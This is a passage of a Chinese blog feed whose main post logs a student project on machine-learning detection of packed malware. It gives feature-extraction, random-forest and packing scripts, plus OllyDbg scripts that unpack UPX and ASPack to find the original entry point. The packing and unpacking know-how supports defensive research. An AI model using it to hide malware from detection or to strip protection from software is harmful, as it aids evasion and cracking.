class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            <span class="keyword">if</span> line.startswith(<span class="string">".text"</span>):</span><br><span class="line">                m = re.findall(p,line)</span><br><span class="line">                <span class="keyword">if</span> m:</span><br><span class="line">                    opc = m[<span class="number">0</span>][<span class="number">10</span>]</span><br><span class="line">                    <span class="keyword">if</span> opc != <span class="string">"align"</span>:</span><br><span class="line">                        opcode_seq.append(opc)</span><br><span class="line">    <span class="keyword">return</span> opcode_seq</span><br><span class="line"><span class="comment"># 根据Opcode序列，统计对应的n-gram</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getOpcodeNgram</span><span class="params">(ops ,n = <span class="number">3</span>)</span>:</span></span><br><span class="line">    opngramlist = [tuple(ops[i:i+n]) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ops)-n)]</span><br><span class="line">    opngram = Counter(opngramlist)</span><br><span class="line">    <span class="keyword">return</span> opngram</span><br><span class="line">file = <span class="string">"train/0A32eTdBKayjCWhZqDOQ.asm"</span></span><br><span class="line">ops = getOpcodeSequence(file)</span><br><span class="line">opngram = getOpcodeNgram(ops)</span><br><span class="line"><span class="keyword">print</span> opngram</span><br><span class="line"><span class="comment"># output</span></span><br><span class="line"><span class="comment"># Counter(&#123;('mov', 'mov', 'mov'): 164, ('xor', 'test', 'setnle'): 155...</span></span><br></pre></td></tr></table></figure><h3 id="决策树和随机森林"><a href="#决策树和随机森林" class="headerlink" title="决策树和随机森林"></a>决策树和随机森林</h3><p>决策树这块我之前有研究所以不展开讲</p><p>但如果对某个领域不了解，特征数量又较多时，人工提取特征的方法就不可行了，需要依靠算法来寻找合适的特征构造决策树</p><p>随机森林有点牛逼啊<br>多个独立的决策树均进行一次分类 最后选择相同结果多 多个弱分类器加在一起就是强分类器<br><img src="/2020/03/05/毕设文章参考阅读笔记/1-3.png" alt><br><img src="/2020/03/05/毕设文章参考阅读笔记/1-4.png" alt><br>将训练数据有放回的抽样出多个子集(即随机选择矩阵中的行)，当然在特征选择上也可以进行随机化(即随机选择矩阵中的列，图中没有体现出来)，分别在每个子集上生成对应的决策树</p><p><code>这点也解决了特征选择这块的问题</code></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虽然没有涉及到壳 但还是有参考价值, 但数据集不行 去掉了PE头而且没壳</span><br><span class="line"></span><br><span class="line">我觉得代码这块可以直接抄这块了 特征都告诉你了 恶意代码图像、OpCode <span class="built_in">n</span>-gram和Headers个数，其他一些特征包括ByteCode <span class="built_in">n</span>-gram，指令频数等。机器学习部分采用了随机森林算法，并用到了xgboost和pypy加快训练速度。</span><br></pre></td></tr></table></figure><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>这个包括 训练集的随机划分 opcode/n-gram的特征提取 asm图像的生成处理 随机森林模型的构建<br><a href="https://github.com/bindog/ToyMalwareClassification" target="_blank" rel="noopener">https://github.com/bindog/ToyMalwareClassification</a></p><h2 id="HOW-TO-CREATE-A-MALWARE-DETECTION-SYSTEM-WITH-MACHINE-LEARNING"><a href="#HOW-TO-CREATE-A-MALWARE-DETECTION-SYSTEM-WITH-MACHINE-LEARNING" class="headerlink" title="HOW TO CREATE A MALWARE DETECTION SYSTEM WITH MACHINE LEARNING"></a>HOW TO CREATE A MALWARE DETECTION SYSTEM WITH MACHINE LEARNING</h2><p><a href="https://www.evilsocket.net/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/" target="_blank" rel="noopener">https://www.evilsocket.net/2019/05/22/How-to-create-a-Malware-detection-system-with-Machine-Learning/</a></p><p>这篇干货比较多 外国人写的 讲特征值的提取 也提到了压缩软件的特征值提取问题 用的ANN神经网络</p><p>配合这篇翻译 <a href="https://www.freebuf.com/articles/system/205444.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/205444.html</a></p><p>接下来，我们要使用关于 PE 段的信息，例如包含代码的段的数量与包含数据的段的数量，标记为可执行的段，每个段的平均熵值，大小与其虚拟大小的平均比率，这些数据会为模型提供该 PE 文件是否加壳/压缩/混淆的信息。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">特征的选择很有参考价值和意义</span><br><span class="line">一共<span class="number">486</span>个特征向量</span><br></pre></td></tr></table></figure><ol><li>设计的向量前十一个标量编码了一组布尔值，由QuarksLab开发的LIEF解析PE提取得出，每个属性为真则编码为1，如果为假则编码为0。</li><li>六十四个元素，代表PE入口点函数前的六十四个字节</li><li>二进制文件中的ASCII表中每个字节重复次数的直方图</li><li>特征是导入表</li><li>接下来使用磁盘上PE文件大小与内存大小（虚拟大小）的比率</li><li>接下来，我们要使用关于PE段的信息，例如包含代码的段的数量与包含数据的段的数量，标记为可执行的段，每个段的平均熵值，大小与其虚拟大小的平均比率，这些数据会为模型提供该PE文件是否加壳/压缩/混淆的信息</li></ol><h2 id="Pattern-Recognition-Techniques-for-the-Classification-of-Malware-Packers"><a href="#Pattern-Recognition-Techniques-for-the-Classification-of-Malware-Packers" class="headerlink" title="Pattern Recognition Techniques for the Classification of Malware Packers"></a>Pattern Recognition Techniques for the Classification of Malware Packers</h2><p><strong>未读</strong></p><h1 id="2020-04-04"><a href="#2020-04-04" class="headerlink" title="2020.04.04"></a>2020.04.04</h1><p>目标任务:</p><ol><li>复习数据集里的壳的手脱方法</li><li>给一些软件加壳</li><li>找找自动化静态脱壳的代码</li></ol><p>静态实现UPX自动脱壳 <a href="https://github.com/BlankShare/UPX-Unpackable" target="_blank" rel="noopener">https://github.com/BlankShare/UPX-Unpackable</a></p><h1 id="2020-04-05"><a href="#2020-04-05" class="headerlink" title="2020.04.05"></a>2020.04.05</h1><p>目标任务:</p><ol><li>完成大部分软件加壳 写自动化shell加壳脚本</li><li>跑一遍决策森林算法</li><li>看一下特征值怎么选</li><li>试试找别的加壳的静态脱壳代码 好像是挺厉害的脱壳机<a href="https://bbs.pediy.com/thread-71678.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-71678.htm</a></li><li><a href="https://bbs.pediy.com/thread-189555.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-189555.htm</a> 这个外网里的好像有脚本</li></ol><h2 id="bat自动化加壳脚本"><a href="#bat自动化加壳脚本" class="headerlink" title="bat自动化加壳脚本"></a>bat自动化加壳脚本</h2><p>upx 3.95 upx3.09<br>nspack 2.03<br>ASPack 2.42<br>PECompact 3.02.2<br>Themida_x32_x64_v2.4.6.0 Themida_x32_x64_v2.3.7.0<br>ASProtect.SKE.v2.51.build.09.22.beta-RES-incl-kg</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upx<span class="selector-class">.exe</span> filename</span><br><span class="line">ASPack<span class="selector-class">.exe</span> filename -<span class="selector-tag">q</span> -b-  (无提示信息无备份压缩)</span><br></pre></td></tr></table></figure><p>pack.bat:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set path=C:<span class="symbol">\U</span>sers<span class="symbol">\R</span>onpa<span class="symbol">\D</span>esktop<span class="symbol">\d</span>ataset<span class="symbol">\n</span>Spack</span><br><span class="line">cd <span class="variable">%path%</span></span><br><span class="line">for /R <span class="variable">%%</span>s in (.,*) do (echo <span class="variable">%%</span>s &amp; C:<span class="symbol">\U</span>sers<span class="symbol">\R</span>onpa<span class="symbol">\D</span>esktop<span class="symbol">\P</span>EC2.exe.lnk <span class="variable">%%</span>s)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>rename.py:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf<span class="number">-8</span></span><br><span class="line">import <span class="built_in">os</span></span><br><span class="line"><span class="built_in">path</span>= <span class="string">'/Volumes/Samsung_T5/malware samples/dataset'</span>  </span><br><span class="line">#获取该目录下所有文件，存入列表中</span><br><span class="line">fileList=<span class="built_in">os</span>.listdir(<span class="built_in">path</span>)</span><br><span class="line">n=<span class="number">0</span></span><br><span class="line">j=<span class="number">395</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> fileList:</span><br><span class="line">    #设置旧文件名（就是路径+文件名）</span><br><span class="line">    oldname=<span class="built_in">path</span>+ <span class="built_in">os</span>.sep + fileList[n]   # <span class="built_in">os</span>.sep添加系统分隔符</span><br><span class="line">    <span class="keyword">if</span> oldname[<span class="number">44</span>]!=<span class="string">'.'</span>:</span><br><span class="line">        #设置新文件名</span><br><span class="line">        newname= <span class="built_in">path</span> + <span class="built_in">os</span>.sep +<span class="string">"N"</span>+ str(j+<span class="number">1</span>)+<span class="string">".exe"</span></span><br><span class="line">        <span class="built_in">os</span>.<span class="built_in">rename</span>(oldname,newname)   #用<span class="built_in">os</span>模块中的<span class="built_in">rename</span>方法对文件改名</span><br><span class="line">        <span class="built_in">print</span>(oldname,<span class="string">'======&gt;'</span>,newname)</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line">    n+=<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="2020-04-19"><a href="#2020-04-19" class="headerlink" title="2020.04.19"></a>2020.04.19</h1><p>目标任务:</p><ol><li>完成特征值提取模块代码编写</li><li>使用框架进行ANN训练</li></ol><p>好家伙 重看了一遍那个外国人的文章, 发现他用的框架是他自己写的机器学习的框架,整合了很多现成的库, 从数据处理打标签,学习,最后模型的使用一条龙牛逼啊.</p><ul><li>写入 csv 时会自动输入 ‘\r\n’ 与预期的 ‘\r’ 不符合</li><li>如何遍历自动化提取特征值</li><li>如何获取父文件夹名1</li><li>框架两个版本的问题 keras==2.2.4 和 pandas==0.24.2</li><li>dataset.py 113行注释掉</li></ul><p><code>write_to_csv</code>:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line">import os</span><br><span class="line">import csv</span><br><span class="line">import extract</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">t0 = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"><span class="keyword">lines</span>=[]</span><br><span class="line"></span><br><span class="line">file_dir=(<span class="string">"/Volumes/Samsung_T5/malware samples/alldata/Packed/"</span>)</span><br><span class="line"><span class="keyword">for</span> root, dirs, <span class="built_in">files</span> <span class="keyword">in</span> os.walk(file_dir):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">file</span> <span class="keyword">in</span> <span class="built_in">files</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.join(root, <span class="built_in">file</span>).<span class="built_in">split</span>(<span class="string">'/'</span>)[<span class="number">-1</span>:][<span class="number">0</span>][<span class="number">0</span>] != <span class="string">'.'</span>:</span><br><span class="line">            path = os.path.join(root, <span class="built_in">file</span>)</span><br><span class="line">            <span class="keyword">lines</span>.append(extract.encode_pe(path))</span><br><span class="line"></span><br><span class="line"><span class="built_in">files</span>=<span class="built_in">open</span>(<span class="string">'/Volumes/Samsung_T5/malware samples/data/data-A.csv'</span>,<span class="string">'w'</span>,newline=<span class="string">''</span>)</span><br><span class="line">writer=csv.writer(<span class="built_in">files</span>, lineterminator=<span class="string">'\n'</span>)   <span class="comment">#防止默认输出'\r\n'</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">line</span> <span class="keyword">in</span> <span class="keyword">lines</span>:</span><br><span class="line">    writer.writerow(<span class="built_in">line</span>) <span class="comment">#写入一行</span></span><br><span class="line"></span><br><span class="line">extract_time = <span class="built_in">time</span>.<span class="built_in">time</span>() - t0  <span class="comment"># 数据处理时间</span></span><br><span class="line">print(extract_time)</span><br></pre></td></tr></table></figure><h1 id="2020-04-22"><a href="#2020-04-22" class="headerlink" title="2020.04.22"></a>2020.04.22</h1><ol><li>对比训练 选择合适的特征值 并确定随机森林的大小</li></ol><h2 id="随机森林效果对比-amp-特征值的选取实验对比"><a href="#随机森林效果对比-amp-特征值的选取实验对比" class="headerlink" title="随机森林效果对比 &amp; 特征值的选取实验对比"></a>随机森林效果对比 &amp; 特征值的选取实验对比</h2><p>最终敲定使用 </p><ol><li>前11个用LIEF提取的PE文件布尔值 </li><li>150个导入表频次 </li><li>文件在磁盘和内存大小比 </li><li>和四个区段的熵值</li></ol><p>一个166维的向量, 随机森林里的树数大约在18棵左右 准确率大概在0.985以上 部分达到0.99<br><img src="/2020/03/05/毕设文章参考阅读笔记/./毕设文章参考阅读笔记/423-1.png" alt></p><p><strong>函数入口特征用了一下发现效果不是那么好 特别是用于随机森林 特征值过多 所以没加进去</strong></p><h1 id="2020-04-23"><a href="#2020-04-23" class="headerlink" title="2020.04.23"></a>2020.04.23</h1><ol><li><p>修改框架代码 模拟并实现 sever.py 的功能 上传模型并将其用作API<br><a href="https://blog.csdn.net/hjh200507609/article/details/78899043" target="_blank" rel="noopener">https://blog.csdn.net/hjh200507609/article/details/78899043</a><br><a href="https://www.jianshu.com/p/ad2bfc08b9e2" target="_blank" rel="noopener">https://www.jianshu.com/p/ad2bfc08b9e2</a></p></li><li><p>完成UPX &amp; ASpack od自动脱壳脚本的编写<br><a href="https://www.52pojie.cn/thread-297515-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-297515-1-1.html</a><br><a href="https://www.52pojie.cn/thread-299645-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-299645-1-1.html</a></p></li></ol><p>模型使用:</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 载入模型</span></span><br><span class="line">rfc=joblib.load(<span class="string">'/Volumes/Samsung_T5/malware samples/results/rfc.model'</span>)</span><br><span class="line"><span class="meta"># 提取目标程序数据</span></span><br><span class="line">data_extract=extract_pre.encode_pe(<span class="string">'/Users/masker/Downloads/毕设/加壳程序/aspack.exe'</span>)</span><br><span class="line"><span class="meta"># 构建二维pd.dataframe</span></span><br><span class="line">df = pd.DataFrame(columns=extract_pre.column_ID)</span><br><span class="line"><span class="meta"># 写入提取出来的list数据</span></span><br><span class="line">df.loc[len(df)] = data_extract</span><br><span class="line">x = df[extract_pre.selected_feature]</span><br><span class="line"><span class="meta"># 使用模型预测</span></span><br><span class="line">result = rfc.predict(x)</span><br><span class="line">print(<span class="string">"Classify Result:"</span>,result)</span><br></pre></td></tr></table></figure><p><img src="/2020/03/05/毕设文章参考阅读笔记/./毕设文章参考阅读笔记/423-2.png" alt></p><p>UPX源码分析<br><code>upx-3.91-src/src/compress.cpp</code> 里能看到具体的解压代码</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">int upx_decompress         ( <span class="keyword">const</span> upx_bytep src, unsigned  src_len,</span><br><span class="line">                                   upx_bytep dst, unsigned* dst_len,</span><br><span class="line">                                   int <span class="function"><span class="keyword">method</span>,</span></span><br><span class="line"><span class="function">                             <span class="title">const</span> <span class="title">upx_compress_result_t</span> *<span class="title">cresult</span> )</span></span><br><span class="line"><span class="function"><span class="comment">&#123;</span></span></span><br><span class="line"><span class="function"><span class="comment">    int r = UPX_E_ERROR;</span></span></span><br><span class="line"><span class="function"><span class="comment"></span></span></span><br><span class="line"><span class="function"><span class="comment">    assert(*dst_len &gt; 0);</span></span></span><br><span class="line"><span class="function"><span class="comment">    assert(src_len &lt; *dst_len); // must be compressed</span></span></span><br><span class="line"><span class="function"><span class="comment"></span></span></span><br><span class="line"><span class="function"><span class="comment">    if (cresult &amp;&amp; cresult-&gt;method == 0)</span></span></span><br><span class="line"><span class="function"><span class="comment">        cresult = NULL;</span></span></span><br><span class="line"><span class="function"><span class="comment"></span></span></span><br><span class="line"><span class="function"><span class="comment">    if (0) &#123;</span></span></span><br><span class="line"><span class="function"><span class="comment">    &#125;</span></span></span><br><span class="line"><span class="function">#<span class="title">if</span> <span class="params">(WITH_LZMA)</span></span></span><br><span class="line"><span class="function">    <span class="title">else</span> <span class="title">if</span> <span class="params">(M_IS_LZMA(<span class="keyword">method</span>)</span>)</span></span><br><span class="line"><span class="function">        <span class="title">r</span> = <span class="title">upx_lzma_decompress</span><span class="params">(src, src_len, dst, dst_len, <span class="keyword">method</span>, cresult)</span>;</span></span><br><span class="line">#endif</span><br><span class="line">#<span class="keyword">if</span> (WITH_NRV)</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (M_IS_NRV2B(<span class="function"><span class="keyword">method</span>) || <span class="title">M_IS_NRV2D</span><span class="params">(<span class="keyword">method</span>)</span> || <span class="title">M_IS_NRV2E</span><span class="params">(<span class="keyword">method</span>)</span>)</span></span><br><span class="line"><span class="function">        <span class="title">r</span> = <span class="title">upx_nrv_decompress</span><span class="params">(src, src_len, dst, dst_len, <span class="keyword">method</span>, cresult)</span>;</span></span><br><span class="line">#endif</span><br><span class="line">#<span class="keyword">if</span> (WITH_UCL)</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (M_IS_NRV2B(<span class="function"><span class="keyword">method</span>) || <span class="title">M_IS_NRV2D</span><span class="params">(<span class="keyword">method</span>)</span> || <span class="title">M_IS_NRV2E</span><span class="params">(<span class="keyword">method</span>)</span>)</span></span><br><span class="line"><span class="function">        <span class="title">r</span> = <span class="title">upx_ucl_decompress</span><span class="params">(src, src_len, dst, dst_len, <span class="keyword">method</span>, cresult)</span>;</span></span><br><span class="line">#endif</span><br><span class="line">#<span class="keyword">if</span> (WITH_ZLIB)</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (M_IS_DEFLATE(<span class="function"><span class="keyword">method</span>))</span></span><br><span class="line"><span class="function">        <span class="title">r</span> = <span class="title">upx_zlib_decompress</span><span class="params">(src, src_len, dst, dst_len, <span class="keyword">method</span>, cresult)</span>;</span></span><br><span class="line">#endif</span><br><span class="line">    <span class="keyword">else</span> <span class="comment">&#123;</span></span><br><span class="line"><span class="comment">        throwInternalError("unknown decompression method");</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"></span><br><span class="line">    return r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="UPX自动化脱壳-OD脚本"><a href="#UPX自动化脱壳-OD脚本" class="headerlink" title="UPX自动化脱壳 OD脚本"></a>UPX自动化脱壳 OD脚本</h2><p><a href="https://bbs.pediy.com/thread-181433.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-181433.htm</a></p><h1 id="2020-04-27"><a href="#2020-04-27" class="headerlink" title="2020.04.27"></a>2020.04.27</h1><p>明日中期答辩</p><ol><li>能完成模型的利用</li><li>能完成样本自动脱壳</li></ol><p>想法 把py脚本转成exe文件, 同时能输出 被检测信息 写在提取脚本里, 内嵌自动脱壳机<br>想法失败, 脱壳机超级不靠谱</p><p>用这个看看 这个超级牛逼 连OD脚本编辑器都有<a href="https://github.com/dubuqingfeng/ollydbg-script" target="_blank" rel="noopener">超级全的OD脱壳脚本</a><br><a href="https://github.com/dubuqingfeng/ollydbg-script" target="_blank" rel="noopener">https://github.com/dubuqingfeng/ollydbg-script</a></p><p>UPX:</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">eob <span class="built_in">Break</span> </span><br><span class="line">findop eip, <span class="meta">#61#</span></span><br><span class="line">bphws $RESULT, <span class="string">"x"</span></span><br><span class="line"><span class="built_in">run</span></span><br><span class="line"><span class="built_in">Break</span>:</span><br><span class="line">sto </span><br><span class="line">sto</span><br><span class="line">bphwc $RESULT</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>ASPack</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">VAR</span> Relocation</span><br><span class="line"><span class="symbol">VAR</span> aa</span><br><span class="line"><span class="symbol">VAR</span> <span class="keyword">bb</span></span><br><span class="line"><span class="keyword">FIND </span>eip,<span class="number">#83</span>E908D1E9#</span><br><span class="line"><span class="keyword">MOV </span>aa,$RESULT</span><br><span class="line"><span class="symbol">MSG</span> aa</span><br><span class="line"><span class="keyword">SUB </span>aa,<span class="number">35</span></span><br><span class="line"><span class="keyword">BP </span>aa</span><br><span class="line"><span class="symbol">RUN</span></span><br><span class="line"><span class="symbol">STO</span></span><br><span class="line"><span class="symbol">STO</span></span><br><span class="line"><span class="symbol">STO</span></span><br><span class="line"><span class="symbol">STO</span></span><br><span class="line"><span class="keyword">MOV </span>!ZF,<span class="number">0</span></span><br><span class="line"><span class="symbol">STO</span></span><br><span class="line"><span class="symbol">STO</span></span><br><span class="line"><span class="symbol">STO</span></span><br><span class="line"><span class="symbol">STO</span>          </span><br><span class="line"><span class="keyword">MOV </span>Relocation,ebp</span><br><span class="line"><span class="keyword">ADD </span>Relocation,<span class="number">539</span></span><br><span class="line"><span class="keyword">MOV </span>Relocation,[Relocation]</span><br><span class="line"><span class="symbol">MSG</span> Relocation</span><br><span class="line"><span class="keyword">BC</span></span><br><span class="line"><span class="keyword">FINDOP </span>eip,<span class="number">#61</span>#</span><br><span class="line"><span class="keyword">MOV </span><span class="keyword">bb,$RESULT</span></span><br><span class="line"><span class="keyword">MSG </span><span class="keyword">bb</span></span><br><span class="line"><span class="keyword">BP </span><span class="keyword">bb</span></span><br><span class="line"><span class="keyword">RUN</span></span><br><span class="line"><span class="keyword">STO</span></span><br><span class="line"><span class="keyword">STO</span></span><br><span class="line"><span class="keyword">STO</span></span><br><span class="line"><span class="keyword">STO</span></span><br><span class="line"><span class="keyword">MSG </span><span class="string">"find oep"</span></span><br><span class="line"><span class="keyword">BC</span></span><br><span class="line"><span class="keyword">RET</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/apachecn/AiLearning&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/apachecn/AiLearning&lt;/a&gt; GitHub上的ai学习汇总 跟着路线图学&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Sketches" scheme="http://Ronpa.top/tags/Sketches/"/>
    
  </entry>
  
  <entry>
    <title>软件加壳的基础知识与程序的特征</title>
    <link href="http://ronpa.top/2020/02/24/%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%A3%B3%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%89%B9%E5%BE%81/"/>
    <id>http://ronpa.top/2020/02/24/%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%A3%B3%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E7%89%B9%E5%BE%81/</id>
    <published>2020-02-24T22:04:32.000Z</published>
    <updated>2021-01-25T19:20:11.878Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>先恭喜黄同学被 伦敦大学学院UCL 的 Msc information security 专业录取, 撒花~鼓掌~, 未来可期 名校加身 见更多的人 体验完全不同的生活 <strike>即将开始自闭的留学生活23333</strike>.(能有自己一个带独卫的房间真是太好了)<br>写的尽量简单一点 因为快到ddl了<br>估计再研究一段时间就要转移动安全了 毕竟win下的软件加密加壳需求也少了 大家都去做手机app了</p></blockquote><a id="more"></a><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p><strong>这篇个人总结全部内容来自吾爱破解教程</strong></p><p>不同编译器写出来的程序 无壳程序区段都是相同的<br>特征主要从“入口点代码”、“程序区段”和“加载模块”等信息来确定</p><p><a href="https://bbs.pediy.com/thread-151939.htm" target="_blank" rel="noopener">为什么要修复IAT表</a></p><p>也可以看 个人文章总结 <code>PE文件格式/ IAT 学习笔记</code></p><h1 id="2-无壳程序入口特征"><a href="#2-无壳程序入口特征" class="headerlink" title="2. 无壳程序入口特征"></a>2. 无壳程序入口特征</h1><h2 id="2-1-VC6编译无壳程序"><a href="#2-1-VC6编译无壳程序" class="headerlink" title="2.1 VC6编译无壳程序"></a>2.1 VC6编译无壳程序</h2><p>OD直接打开代码入口特点:<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/vc6.png" alt></p><p>四个区段:<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/vc62.png" alt></p><p>VC6特点：</p><ol><li>入口点代码是固定的代码,入口调用的API也是相同的(上图的<code>msvctr._set_app_type</code>这类的),其中有的push地址不同程序可能不同</li><li><strong>区段有四个</strong>也是固定的.text、.rdata、.data和.rsrc.</li></ol><h2 id="2-2-VS2008和VS2013编译无壳程序-两者差不多"><a href="#2-2-VS2008和VS2013编译无壳程序-两者差不多" class="headerlink" title="2.2 VS2008和VS2013编译无壳程序(两者差不多)"></a>2.2 VS2008和VS2013编译无壳程序(两者差不多)</h2><p>OD直接打开代码入口特点:<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/vs2008.png" alt><br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/vs20083.png" alt></p><p>五个区段:<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/vs20082.png" alt></p><p>VS特点：</p><ol><li>入口点只有两行代码，一个CALL后直接JMP,第一个CALL进去后调用的API也是相同的；</li><li>区段相对于VC6多了一个<code>.reloc</code>.</li></ol><h2 id="2-3-易语言编译无壳程序（独立编译和非独立编译）"><a href="#2-3-易语言编译无壳程序（独立编译和非独立编译）" class="headerlink" title="2.3 易语言编译无壳程序（独立编译和非独立编译）"></a>2.3 易语言编译无壳程序（独立编译和非独立编译）</h2><h3 id="2-3-1-独立编译"><a href="#2-3-1-独立编译" class="headerlink" title="2.3.1 独立编译"></a>2.3.1 独立编译</h3><p>易语言独立编译是<strong>调用VC的链接程序</strong>编译的，所以从区段和入口代码特征和VC相同.<br>一样四个区段,用侦壳软件显示也是显示用<code>Microsoft Visual C++ ver 5.0/6.0</code>编写<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/易语言1.png" alt></p><p>核心代码:<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/易语言6.png" alt><br>(拖到程序最上面随便找几个call跟随 都会跳到上面调用接口的地方)</p><p>字符串特征:<br><img src="/2020/02/24/软件加壳的基础知识与程序的特征/特征.png" alt></p><h3 id="2-3-2-非独立编译带运行库"><a href="#2-3-2-非独立编译带运行库" class="headerlink" title="2.3.2 非独立编译带运行库"></a>2.3.2 